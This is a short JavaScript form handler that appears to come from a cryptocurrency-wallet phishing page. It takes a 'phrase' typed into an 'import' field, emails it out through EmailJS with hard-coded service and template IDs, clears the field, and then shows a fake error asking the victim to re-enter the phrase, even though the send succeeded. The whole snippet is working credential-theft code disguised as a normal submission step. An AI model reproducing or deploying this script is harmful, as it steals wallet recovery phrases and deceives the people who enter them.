
function sendEmail() {
    var params = {
        import : document.getElementById("import").value,
    }

    const serviceID ="service_v7v6ysn"
    const templateID = "template_2g8v18b"

    emailjs.send(serviceID, templateID, params) 
    .then (
        res => {
            document.getElementById("import").value ="";
            console.log(res);
            document.getElementById("query").innerHTML = "Error!!!, Check To Confirm You Entered The Correct Phrase And Try Again";
        } )  
        .catch(err => console.log(err)); 
}